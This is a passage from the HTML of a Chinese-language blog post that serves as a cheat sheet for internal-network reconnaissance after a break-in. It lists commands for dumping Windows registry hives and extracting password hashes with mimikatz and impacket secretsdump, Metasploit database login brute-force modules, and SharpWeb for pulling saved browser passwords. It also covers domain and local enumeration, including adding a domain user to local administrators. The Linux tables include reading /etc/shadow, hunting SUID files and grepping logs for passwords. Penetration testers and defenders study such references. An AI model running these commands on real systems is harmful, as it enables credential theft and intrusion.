HKLM\SAM sam.hiv</span><br><span class="line">reg save hklm\security security.hiv</span><br><span class="line">python &#x2F;root&#x2F;impacket&#x2F;examples&#x2F;secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY sercrity.hiv</span><br><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;system:system.hiv &#x2F;sam:sam.hiv &#x2F;sercrity:sercrity.hiv&quot; exit</span><br><span class="line"></span><br><span class="line">5.mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;&gt; password.txt</span><br></pre></td></tr></table></figure>

<p><strong>8.各种数据库明文密码搜集及爆破</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;smb_login</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;redis_login</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mysql_login</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;postgres_login</span><br></pre></td></tr></table></figure>

<p><strong>9.web浏览器保存密码获取</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sharpweb.exe</span><br><span class="line">Usage:</span><br><span class="line">    .\SharpWeb.exe arg0 [arg1 arg2 ...]</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">    all       - Retrieve all Chrome, FireFox and IE&#x2F;Edge credentials.</span><br><span class="line">    full      - The same as &#39;all&#39;</span><br><span class="line">    chrome    - Fetch saved Chrome logins.</span><br><span class="line">    firefox   - Fetch saved FireFox logins.</span><br><span class="line">    edge      - Fetch saved Internet Explorer&#x2F;Microsoft Edge logins.</span><br></pre></td></tr></table></figure>

<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all                											------ 查询本机IP段，所在域等</span><br><span class="line">net user                    											------ 本机用户列表</span><br><span class="line">net localgroup administrators            					------ 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain                         					------ 查询域用户</span><br><span class="line">net group &#x2F;domain                        					------ 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain        					------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain    					------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add   ------域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain        		------ 查看域控制器(如果有多台)</span><br><span class="line">net time &#x2F;domain                  								------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net config workstation            								------ 当前登录域</span><br><span class="line">net session                        								------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword &#x2F;user:username          ------ 建立IPC会话[空连接-***]</span><br><span class="line">net share                          								------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                           								------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                      								------ 查询某IP共享</span><br><span class="line">net view &#x2F;domain                   								------ 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname        								------ 查看workgroup域中计算机列表</span><br><span class="line">net start                          								------ 查看当前运行的服务</span><br><span class="line">net accounts                       								------  查看本地密码策略</span><br><span class="line">net accounts &#x2F;domain              								------  查看域密码策略</span><br><span class="line">nbtstat –A ip                      								------netbios 查询</span><br><span class="line">netstat –an&#x2F;ano&#x2F;anb                								------ 网络连接查询</span><br><span class="line">route print                        								------ 路由表</span><br><span class="line">tasklist &#x2F;V                        								----- 查看进程[显示对应用户]</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V           ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                         								----- 类似tasklist</span><br><span class="line">qprocess &#x2F;SERVER:IP                								----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com          								----- 查看邮件服务器</span><br><span class="line">whoami &#x2F;all                        								----- 查询当前用户权限等</span><br><span class="line">set                                								----- 查看系统环境变量</span><br><span class="line">systeminfo                        								----- 查看系统信息</span><br><span class="line">qwinsta                            								----- 查看登录情况</span><br><span class="line">qwinsta &#x2F;SERVER:IP                 								----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives               								----- 查看所有盘符</span><br><span class="line">gpupdate &#x2F;force                    								----- 更新域策略cmdkey &#x2F;l</span><br></pre></td></tr></table></figure>

<h4 id="收集域内信息图形化展示"><a href="#收集域内信息图形化展示" class="headerlink" title="收集域内信息图形化展示"></a>收集域内信息图形化展示</h4><p><strong>SharpHound+neo4j</strong></p>
<h4 id="枚举域内信息"><a href="#枚举域内信息" class="headerlink" title="枚举域内信息"></a>枚举域内信息</h4><p><strong><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">sharpview</a></strong></p>
<p><em>重点关注域管有sessions的机器*</em></p>
<h4 id="spn扫描"><a href="#spn扫描" class="headerlink" title="spn扫描"></a>spn扫描</h4><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">uname -a</td>
<td align="left">打印所有可用的系统信息</td>
</tr>
<tr>
<td align="left">uname -r</td>
<td align="left">内核版本信息</td>
</tr>
<tr>
<td align="left">uname -n</td>
<td align="left">系统主机名字</td>
</tr>
<tr>
<td align="left">hostname</td>
<td align="left">主机名</td>
</tr>
<tr>
<td align="left">uname -m</td>
<td align="left">Linux内核架构（x86/x64）</td>
</tr>
<tr>
<td align="left">cat /proc/version</td>
<td align="left">内核信息</td>
</tr>
<tr>
<td align="left">cat /etc/*-release</td>
<td align="left">发布信息</td>
</tr>
<tr>
<td align="left">cat /etc/issue</td>
<td align="left">发布信息</td>
</tr>
<tr>
<td align="left">cat /proc/cpuinfo</td>
<td align="left">CPU信息</td>
</tr>
<tr>
<td align="left">df -a</td>
<td align="left">文件系统信息</td>
</tr>
</tbody></table>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">cat /etc/passwd</td>
<td align="left">列出系统所有用户</td>
</tr>
<tr>
<td align="left">cat /etc/group</td>
<td align="left">列出系统所有组</td>
</tr>
<tr>
<td align="left">cat /etc/shadow</td>
<td align="left">列出所有用户hash（需要root权限）</td>
</tr>
<tr>
<td align="left">finger、finger user</td>
<td align="left">当前登录的用户、查询用户的基本信息</td>
</tr>
<tr>
<td align="left">users</td>
<td align="left">当前登录的用户</td>
</tr>
<tr>
<td align="left">who -a</td>
<td align="left">当前登录的用户</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">显示目前登入系统的用户有那些人，以及他们正在执行的程序</td>
</tr>
<tr>
<td align="left">last</td>
<td align="left">显示登入过的用户信息</td>
</tr>
<tr>
<td align="left">lastlog</td>
<td align="left">显示系统中所有用户最近一次登录信息</td>
</tr>
<tr>
<td align="left">lastlog –u %username%</td>
<td align="left">显示指定用户最后一次登入信息</td>
</tr>
</tbody></table>
<p>用户和权限信息</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">whoami</td>
<td align="left">当前用户</td>
</tr>
<tr>
<td align="left">id</td>
<td align="left">当前用户信息</td>
</tr>
<tr>
<td align="left">cat /etc/sudoers</td>
<td align="left">可以使用sudo提升到root的用户（需要root权限）</td>
</tr>
<tr>
<td align="left">sudo</td>
<td align="left">允许普通用户执行一些或者全部的root命令的一个工具</td>
</tr>
<tr>
<td align="left">sudo -l</td>
<td align="left">列出目前用户可执行与无法执行的指令</td>
</tr>
<tr>
<td align="left">su</td>
<td align="left">切换当前用户身份到其他用户身份</td>
</tr>
</tbody></table>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">env</td>
<td align="left">打印系统环境信息</td>
</tr>
<tr>
<td align="left">set</td>
<td align="left">打印系统环境信息</td>
</tr>
<tr>
<td align="left">echo $PATH</td>
<td align="left">环境变量中的路径信息</td>
</tr>
<tr>
<td align="left">history</td>
<td align="left">打印历史命令</td>
</tr>
<tr>
<td align="left">pwd</td>
<td align="left">显示当前路径</td>
</tr>
<tr>
<td align="left">cat /etc/profile</td>
<td align="left">显示默认系统遍历</td>
</tr>
<tr>
<td align="left">cat /etc/shells</td>
<td align="left">显示可用的shell</td>
</tr>
</tbody></table>
<h3 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">find / -perm -4000 -type f</td>
<td align="left">查找SUID的文件</td>
</tr>
<tr>
<td align="left">find / -uid 0 -perm -4000 -type f</td>
<td align="left">查找root权限的SUID文件</td>
</tr>
<tr>
<td align="left">find / -perm -2 -type f</td>
<td align="left">找出可写的文件</td>
</tr>
<tr>
<td align="left">find / ! -path “/proc/“ -perm -2 -type f -print</td>
<td align="left">查找/proc以外的可写文件</td>
</tr>
<tr>
<td align="left">find / -perm -2 -type d</td>
<td align="left">找出可写目录</td>
</tr>
<tr>
<td align="left">find /home –name *.rhosts -print</td>
<td align="left">查找rhosts的配置文件</td>
</tr>
<tr>
<td align="left">find /home -iname *.plan -exec ls -la {} ; -exec cat {}</td>
<td align="left">查询文件并打印</td>
</tr>
<tr>
<td align="left">ls -ahlR /root/</td>
<td align="left">查看是否有权限列用户目录</td>
</tr>
<tr>
<td align="left">cat ~/.bash_history</td>
<td align="left">查看当前用户的历史记录</td>
</tr>
<tr>
<td align="left">ls -la ~/.*_history</td>
<td align="left">查看当前用户的各种历史记录</td>
</tr>
<tr>
<td align="left">ls -la ~/.ssh/</td>
<td align="left">查看用户ssh登录信息</td>
</tr>
<tr>
<td align="left">ls -la /usr/sbin/in.*</td>
<td align="left">检查inetd服务的配置</td>
</tr>
<tr>
<td align="left">grep -l -i pass /var/log/*.log</td>
<td align="left">查询包含pass的日志并打印匹配到的行</td>
</tr>
<tr>
<td align="left">ls -la /etc/*.conf</td>
<td align="left">列出/etc/下的所有配置文件</td>
</tr>
<tr>
<td align="left">lsof -i -n</td>
<td align="left">列出打开的文件</td>
</tr>
<tr>
<td align="left">head /var/mail/root</td>
<td align="left">答应/var/mail/root的开头</td>
</tr>
</tbody></table>
<h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ps aux</td>
<td align="left">查看进程信息</td>
</tr>
<tr>
<td align="left">cat /etc/inetd.conf</td>
<td align="left">由inetd管理的服务列表</td>
</tr>
<tr>
<td align="left">cat /etc/xinetd.conf</td>
<td align="left">由xinetd管理的服务列表</td>
</tr>
<tr>
<td align="left">cat /etc/exports</td>
<td align="left">nfs服务器的配置</td>
</tr>
</tbody></table>
<h3 id="作业和任务"><a href="#作业和任务" class="headerlink" title="作业和任务"></a>作业和任务</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">crontab -l -u %username%</td>
<td align="left">显示指定用户的计划作业（需要root权限）</td>
</tr>
<tr>
<td align="left">ls -la /etc/cron*</td>
<td align="left">计划任务</td>
</tr>
<tr>
<td align="left">top</td>
<td align="left">列出当前进程</td>
</tr>
</tbody></table>
<h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/sbin/ifconfig -a</td>
<td align="left">列出网络接口信息</td>
</tr>
<tr>
<td align="left">cat /etc/network/interfaces</td>
<td align="left">列出网络接口信息</td>
</tr>
<tr>
<td align="left">arp -a</td>
<td align="left">查看系统arp表</td>
</tr>
<tr>
<td align="left">route</td>
<td align="left">打印如有信息</td>
</tr>
<tr>
<td align="left">cat /etc/resolv.conf</td>
<td align="left">查看dns配置信息</td>
</tr>
<tr>
<td align="left">netstat -an</td>
<td align="left">打印本地端口开放信息</td>
</tr>
<tr>
<td align="left">iptables -L</td>
<td align="left">列出iptable的配置规则</td>
</tr>
<tr>
<td align="left">cat /etc/services</td>
<td align="left">查看端口服务映射</td>
</tr>
</tbody></table>
<h3 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">dpkg -l</td>
<td align="left">软件安装（Debian）</td>
</tr>
<tr>
<td align="left">rpm -qa</td>
<td align="left">软件安装（Red Hat）</td>
</tr>
<tr>
<td align="left">sudo -V</td>
<td align="left">查看sudo的版本信息</td>
</tr>
<tr>
<td align="left">httpd -v</td>
<td align="left">查看apache的版本信息</td>
</tr>
<tr>
<td align="left">apache2 -v</td>
<td align="left">查看apache的版本信息</td>
</tr>
<tr>
<td align="left">apache2ctl (or apachectl) -M</td>
<td align="left">列出加载的apache模块</td>
</tr>
<tr>
<td align="left">mysql –version</td>
<td align="left">mysql的版本信息</td>
</tr>
<tr>
<td align="left">psql -V</td>
<td align="left">Postgres数据库的版本信息</td>
</tr>
<tr>
<td align="left">perl -v</td>
<td align="left">perl的版本信息</td>
</tr>
<tr>
<td align="left">java -version</td>
<td align="left">java的版本信息</td>
</tr>
<tr>
<td align="left">python –version</td>
<td align="left">python的版本信息</td>
</tr>
<tr>
<td align="left">ruby -v</td>
<td align="left">ruby的版本信息</td>
</tr>
<tr>
<td align="left">find / -name %program_name%</td>
<td align="left">查找有用的软件</td>
</tr>
<tr>
<td align="left">which %program_name%</td>
<td align="left">查找有用的软件</td>
</tr>
<tr>
<td align="left">cat /etc/apache2/envvars</td>
<td align="left">查看运行apache的帐号</td>
</tr>
</tbody></table>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#单机环境"><span class="toc-number">1.1.</span> <span class="toc-text">单机环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ip段"><span class="toc-number">1.1.1.</span> <span class="toc-text">ip段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网络连通性"><span class="toc-number">1.1.2.</span> <span class="toc-text">网络连通性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#系统信息"><span class="toc-number">1.1.3.</span> <span class="toc-text">系统信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#进程-amp-amp-安装软件"><span class="toc-number">1.1.4.</span> <span class="toc-text">进程&amp;&amp;安装软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用户"><span class="toc-number">1.1.5.</span> <span class="toc-text">用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#管理员-history"><span class="toc-number">1.1.6.</span> <span class="toc-text">管理员 history</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补丁"><span class="toc-number">1.1.7.</span> <span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#密码收集"><span class="toc-number">1.1.8.</span> <span class="toc-text">密码收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#域环境"><span class="toc-number">1.2.</span> <span class="toc-text">域环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用命令"><span class="toc-number">1.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#收集域内信息图形化展示"><span class="toc-number">1.2.2.</span> <span class="toc-text">收集域内信息图形化展示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#枚举域内信息"><span class="toc-number">1.2.3.</span> <span class="toc-text">枚举域内信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spn扫描"><span class="toc-number">1.2.4.</span> <span class="toc-text">spn扫描</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-number">2.</span> <span class="toc-text">linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取内核，操作系统和设备信息"><span class="toc-number">2.1.</span> <span class="toc-text">获取内核，操作系统和设备信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用户和组"><span class="toc-number">2.2.</span> <span class="toc-text">用户和组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境信息"><span class="toc-number">2.3.</span> <span class="toc-text">环境信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#有用的命令"><span class="toc-number">2.4.</span> <span class="toc-text">有用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务信息"><span class="toc-number">2.5.</span> <span class="toc-text">服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#作业和任务"><span class="toc-number">2.6.</span> <span class="toc-text">作业和任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络、路由和通信"><span class="toc-number">2.7.</span> <span class="toc-text">网络、路由和通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#软件信息"><span class="toc-number">2.8.</span> <span class="toc-text">软件信息</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&text=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&is_video=false&description=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网信息收集&body=Check out this article: http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&name=内网信息收集&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&t=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 ceeeeeeb
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
